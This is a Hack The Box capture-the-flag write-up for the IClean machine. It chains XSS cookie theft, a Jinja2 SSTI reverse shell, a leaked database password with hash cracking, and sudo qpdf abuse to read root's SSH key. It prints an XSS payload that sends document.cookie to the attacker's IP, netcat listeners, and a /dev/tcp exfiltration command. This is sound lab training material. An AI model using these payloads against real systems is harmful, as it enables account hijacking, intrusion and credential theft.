---
layout: writeup
category: HTB
description: IClean is a Linux medium machine where we will learn different things. First, there is a web that offers a cleaning service where I will exploit an XSS vulnerability to retrieve admin's cookie. Then, I will exploit SSTI vulnerability to gain access as www-data. From there, I can get credentials for the database and crack a hash for consuela user. Finally, I will abuse the --add-attachment option of qpdf to exploit a sudoers privilege.
points: 30
solves: 3727
tags: xss ssti sql password-reuse qpdf sudoers
date: 2024-08-03
title: HTB IClean writeup
comments: false
---

IClean is a Linux medium machine where we will learn different things. First, there is a web that offers a cleaning service where I will exploit an XSS vulnerability to retrieve admin's cookie. Then, I will exploit SSTI vulnerability to gain access as www-data. From there, I can get credentials for the database and crack a hash for consuela user. Finally, I will abuse the --add-attachment option of qpdf to exploit a sudoers privilege.

# Enumeration

## Port scanning

I will start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:

```bash
# Nmap 7.94SVN scan initiated Wed Jul 31 00:17:33 2024 as: nmap -sSVC -p- --open --min-rate 5000 -v -n -Pn -oN iclean 10.10.11.12
Nmap scan report for 10.10.11.12
Host is up (0.035s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
|_  256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 31 00:17:51 2024 -- 1 IP address (1 host up) scanned in 18.25 seconds
```

* -sVC: Identifies service and version.
* -p-: scans all the range of ports (1-65535).
* --open: shows only open ports and not filtered or closed.
* -sS: TCP SYN scan that improves velocity because it doesn't establish the connection.
* --min-rate 5000: Sends 5000 packets per second to improve velocity (don't do this in a 
real environment).
* -n: Disables DNS resolution protocol.
* -v: Enables verbose to see which ports are opened while it's scanning
* -Pn: Disables host discovery protocol (ping).
* -oN targeted: Exports the evidence to a file named "tcpTargeted".

There is port 80 running apache server, so let's jump into it.

## Web enumeration
            
Looking at the server response, it's very short:

```bash
❯ curl -i http://10.10.11.12
HTTP/1.1 200 OK
Date: Tue, 30 Jul 2024 22:19:37 GMT
Server: Apache/2.4.52 (Ubuntu)
Last-Modified: Tue, 05 Sep 2023 16:40:51 GMT
ETag: "112-6049f4a35f3a4"
Accept-Ranges: bytes
Content-Length: 274
Vary: Accept-Encoding
Content-Type: text/html

<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="0;url=http://capiclean.htb">
</head>
<body>
    <!-- Optional content for users without JavaScript -->
    <p>If you are not redirected, <a href="http://capiclean.htb">click here</a>.</p>
</body>
</html>
```

It redirects to capiclean.htb, so I will add this line to the /etc/hosts:

```plaintext
10.10.11.12 capiclean.htb
```

This page shows a cleaning service web:

![capiclean.htb main page](/assets/images/IClean/capiclean.htb.png)

Looking more below, it's possible to see a "Get a quote" button:

![get a quote button](/assets/images/IClean/get-a-quote-capiclean.htb.png)

There, I can request a service to clean something, which makes a POST request to /sendMessage:

![quote page](/assets/images/IClean/quote-page.png)

![get a quote request](/assets/images/IClean/get-a-quote-request.png)

As it seems to send a message, I will try an HTML injection that loads an image from my http server. For that, I will start a simple python http server:

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

![tried html injection](/assets/images/IClean/tried-html-injection.png)

The response doesn't change, but we receive a request for test.jpg from the machine's IP (10.10.11.12):

![request for test.jpg](/assets/images/IClean/request-for-test.jpg.png)

I will try to retrieve somebody's cookie by injecting a script which sends a request to my server with his cookie as the route. Trying with `<script>fetch("http://10.10.15.95/"+document.cookie)</script>` doesn't works but with a onerror declaration of an img tag, I can successfully retrieve somebody's cookie:

![onerror img send cookie](/assets/images/IClean/onerror-img-send-cookie.png)

```c
10.10.11.12 - - [31/Jul/2024 00:44:32] code 404, message File not found
10.10.11.12 - - [31/Jul/2024 00:44:32] "GET /session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZqlNgw.V8pGQ30feKi2NhOM1MrEEUvxMcY HTTP/1.1" 404 -
```

Fuzzing to find a route where this cookie would be useful, I can see /dashboard, which without cookie gives a redirect to /:

```c
❯ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -u http://capiclean.htb/FUZZ -mc all -fc 404

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://capiclean.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-large-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
________________________________________________

login                   [Status: 200, Size: 2106, Words: 297, Lines: 88, Duration: 44ms]
logout                  [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 53ms]
about                   [Status: 200, Size: 5267, Words: 1036, Lines: 130, Duration: 67ms]
services                [Status: 200, Size: 8592, Words: 2325, Lines: 193, Duration: 72ms]
.                       [Status: 200, Size: 16697, Words: 4654, Lines: 349, Duration: 85ms]
dashboard               [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 74ms]
team                    [Status: 200, Size: 8109, Words: 2068, Lines: 183, Duration: 84ms]
quote                   [Status: 200, Size: 2237, Words: 98, Lines: 90, Duration: 78ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 32ms]
choose                  [Status: 200, Size: 6084, Words: 1373, Lines: 154, Duration: 115ms]
sendMessage             [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 151ms]
:: Progress: [119600/119600] :: Job [1/1] :: 203 req/sec :: Duration: [0:06:04] :: Errors: 0 ::
```

```plaintext
❯ curl -i http://capiclean.htb/dashboard
HTTP/1.1 302 FOUND
Date: Tue, 30 Jul 2024 22:58:29 GMT
Server: Werkzeug/2.3.7 Python/3.10.12
Content-Type: text/html; charset=utf-8
Content-Length: 189
Location: /
Vary: Cookie

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
```

So I will introduce this cookie into firefox and navigate to /dashboard:

![dashboard with cookie](/assets/images/IClean/dashboard-with-cookie.png)

There's a bunch of functionalities here, let's see each one carefully.

### Generate Invoice

This leds to /InvoiceGenerator, its to generate a invoice for the clients that want the cleaning service:

![invoiceGenerator](/assets/images/IClean/invoiceGenerator.png)

When some data is submitted, it gives a "Invoice ID":

![invoiceGenerator request](/assets/images/IClean/invoiceGeneratorRequest.png)

### Generate QR

This page asks for a Invoice ID:

![QR Generator](/assets/images/IClean/qrGenerator.png)

I will introduce the one I created before and see what happens:

![QR Generator Request](/assets/images/IClean/qrGeneratorRequest.png)

![QR Generator Response browser](/assets/images/IClean/qr-generator-response-browser.png)

Now, it gives a valid link for an image (which is a QR) that looks like this:

![QR Code png](/assets/images/IClean/qr-code-png.png)

Also, there is a new form to generate the scannable invoice where I need to introduce the qr link given. I will introduce it and see it reflects my data:

![scannable invoice response](/assets/images/IClean/scannable-invoice-response.png)

Also notice that the img is loaded with the data:// wrapper:

![qr image data wrapper](/assets/images/IClean/qr-image-data-wrapper.png)

For some strange reason, if I inject a SSTI payload, it interprets and shows the data there:

![ssti qr_link](/assets/images/IClean/ssti-qr_link.png)

# Access as www-data

The only payload that works in this case to execute commands it's this from [payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2):

![ssti command injection](/assets/images/IClean/ssti-command-injection.png)

So I will start a nc listener to receive a shell and start the typical one with bash:

```bash
❯ nc -lvnp 443
listening on [any] 443 ...
```

![reverse shell executed](/assets/images/IClean/reverse-shell-executed.png)

And I receive the reverse shell!:

![shell received](/assets/images/IClean/shell-received.png)

The `script /dev/null -c bash` command doesn't work here:

```bash
www-data@iclean:/opt/app$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
This account is currently not available.
Script done.
```

So I will use python instead and do the same as always for a proper shell:

```bash
www-data@iclean:/opt/app$ python3 -c "import pty; pty.spawn('/bin/bash')"
python3 -c "import pty; pty.spawn('/bin/bash')"
www-data@iclean:/opt/app$ ^Z
[1]  + 40695 suspended  nc -lvnp 443
❯ stty raw -echo; fg
[1]  + 40695 continued  nc -lvnp 443
                                    reset xterm
www-data@iclean:/opt/app$ export TERM=xterm
www-data@iclean:/opt/app$ export SHELL=bash
www-data@iclean:/opt/app$ stty rows 50 columns 184
```

* ``python3 -c "import pty; pty.spawn('/bin/bash')"``: Spawns a tty.
* ``ctrl+z``: puts the shell in background for later doing a treatment.
* ``stty raw -echo;fg``: give us the shell back again.
* ``reset xterm``: resets the terminal to give us the bash console.
* ``export TERM=xterm``: let us do ctrl+l to clean the terminal.
* ``export SHELL=bash``: specifies the system that we are using a bash console.
* ``stty rows <YOUR ROWS> columns <YOUR COLUMNS>``: establishes the size of the current full terminal window, you can view the adequate running stty size on your machine (you 
can view it with `stty size` in a complete new window).

# Access as consuela

Looking at the users with shell (ends with sh), there is only one user called 'consuela' apart from root:

```bash
www-data@iclean:/opt/app$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
consuela:x:1000:1000:consuela:/home/consuela:/bin/bash
```

Also, in the app.py, to check the users it's using a SQL database:

```python
www-data@iclean:/opt/app$ cat app.py 
from flask import Flask, render_template, request, jsonify, make_response, session, redirect, url_for
from flask import render_template_string
import pymysql
import hashlib
import os
import random, string
import pyqrcode
from jinja2 import StrictUndefined
from io import BytesIO
import re, requests, base64

app = Flask(__name__)

app.config['SESSION_COOKIE_HTTPONLY'] = False

secret_key = ''.join(random.choice(string.ascii_lowercase) for i in range(64))
app.secret_key = secret_key
# Database Configuration
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
}

<..SNIP..>
```

This password doesn't work with consuela:

```bash
www-data@iclean:/opt/app$ su consuela
Password: pxCsmnGLckUb
su: Authentication failure
```

But I can connect to the database:

```bash
www-data@iclean:/opt/app$ mysql -u'iclean' -p
Enter password: pxCsmnGLckUb
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 450
Server version: 8.0.36-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

In the capiclean database there is a 'users' table:

```bash
mysql> use capiclean;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------+
| Tables_in_capiclean |
+---------------------+
| quote_requests      |
| services            |
| users               |
+---------------------+
3 rows in set (0.01 sec)
```

I will describe it to see the columns and extract the interesting ones:

```bash
mysql> describe users;
+----------+-------------+------+-----+---------+----------------+
| Field    | Type        | Null | Key | Default | Extra          |
+----------+-------------+------+-----+---------+----------------+
| id       | int         | NO   | PRI | NULL    | auto_increment |
| username | varchar(50) | NO   | UNI | NULL    |                |
| password | char(64)    | NO   |     | NULL    |                |
| role_id  | char(32)    | NO   |     | NULL    |                |
+----------+-------------+------+-----+---------+----------------+
4 rows in set (0.00 sec)
```

```bash
mysql> select username,password from users;
+----------+------------------------------------------------------------------+
| username | password                                                         |
+----------+------------------------------------------------------------------+
| admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 |
| consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa |
+----------+------------------------------------------------------------------+
2 rows in set (0.00 sec)
```

There are two hashes, one for admin and another for consuela. This hashes are sha256 as can be shown in the login functionality of the script that runs the webserver:

```python
www-data@iclean:/opt/app$ cat app.py 
<..SNIP..>
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html', error=False)
    elif request.method == 'POST':
        username = request.form['username']
        password = hashlib.sha256(request.form['password'].encode()).hexdigest()

        with pymysql.connect(**db_config) as conn:
            with conn.cursor() as cursor:
                cursor.execute('SELECT role_id FROM users WHERE username=%s AND password=%s', (username, password))
                result = cursor.fetchone()

                if result is None:
                    return render_template('login.html',error='Invalid username or password')
                else:
                    session['role'] = result[0]
                    if session['role'] == hashlib.md5(b'admin').hexdigest():
                        return redirect(url_for('dashboard'))
                    else:
                        return redirect(url_for('/'))
    else:
        return make_response('Invalid request format.', 400)
<..SNIP..>
```

I will try to crack them with john and the consuela one is crackable:

```bash
❯ cat sql-hashes.txt
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: sql-hashes.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ admin:2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51
   2   │ consuela:0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

```plaintext
❯ john -w=/usr/share/wordlists/rockyou.txt sql-hashes.txt --format=Raw-SHA256
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1g 0:00:00:01 DONE (2024-07-31 21:16) 0.8849g/s 12693Kp/s 12693Kc/s 16057KC/s -sevim-..*7¡Vamos!
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed. 
```

Also works for consuela in the machine and I have access as consuela:

```plaintext
www-data@iclean:/opt/app$ su consuela
Password: simple and clean
consuela@iclean:/opt/app$ whoami
consuela
```

And we can see user.txt!:

```bash
consuela@iclean:/opt/app$ cd ~
consuela@iclean:~$ cat user.txt 
53****************************7b
```

# Access as root

Looking at sudo privileges, I can run /usr/bin/qpdf as any user I want:

```bash
consuela@iclean:~$ sudo -l
[sudo] password for consuela: simple and clean
Matching Defaults entries for consuela on iclean:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User consuela may run the following commands on iclean:
    (ALL) /usr/bin/qpdf
consuela@iclean:~$ 
```

Searching `qpdf` in google I can see it's a C++ program to manage PDF files:

![what is qpdf](/assets/images/IClean/what-is-qpdf.png)

I also have the version:

```bash
consuela@iclean:~$ /usr/bin/qpdf --version
qpdf version 10.6.3
Run qpdf --copyright to see copyright and license information.
```

There isn't a known vulnerability for this version. However, I can read its [documentation](https://qpdf.readthedocs.io/en/stable/) and see if I can find any functionality to abuse this sudo privilege as root. In [this section](https://qpdf.readthedocs.io/en/stable/cli.html#embedded-files-attachments) there are options to list, add or delete embedded files in pdfs, so I will use --add-attachment to add /root/.ssh/id_rsa to a dummy pdf. For that, I will use a http server to upload my pdf file to the machine:

**Attacker machine**:
```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

**IClean machine**:
```bash
consuela@iclean:~$ cd /tmp/
consuela@iclean:/tmp$ wget http://10.10.15.95/dummy.pdf
--2024-07-31 20:09:49--  http://10.10.15.95/dummy.pdf
Connecting to 10.10.15.95:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13264 (13K) [application/pdf]
Saving to: ‘dummy.pdf’

dummy.pdf                                     100%[=================================================================================================>]  12.95K  --.-KB/s    in 0s      

2024-07-31 20:09:49 (190 MB/s) - ‘dummy.pdf’ saved [13264/13264]
```

Now execute this command to add the attachment /root/.ssh/id_rsa to dummyWithSSHKey.pdf:

```bash
consuela@iclean:/tmp$ sudo qpdf dummy.pdf dummyWithSSHKey.pdf --add-attachment /root/.ssh/id_rsa --
```

I will transfer it to my machine to work better:

**Attacker**:
```bash
❯ nc -lvnp 443 > dummyWithSSHKey.pdf
listening on [any] 443 ...
```

**IClean**:
```bash
consuela@iclean:/tmp$ cat dummyWithSSHKey.pdf > /dev/tcp/10.10.15.95/443 0>&1
```

Viewing it in Firefox, it's possible to obtain the root ssh key:

![id_rsa in pdf exists](/assets/images/IClean/id_rsa-in-pdf-file-exists.png)

Clicking on it just downloads it. Now I can connect as root to IClean and see root.txt!:

```bash
❯ ssh -i id_rsa root@10.10.11.12
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

<..SNIP..>

root@iclean:~# cat root.txt 
2f****************************9d
```
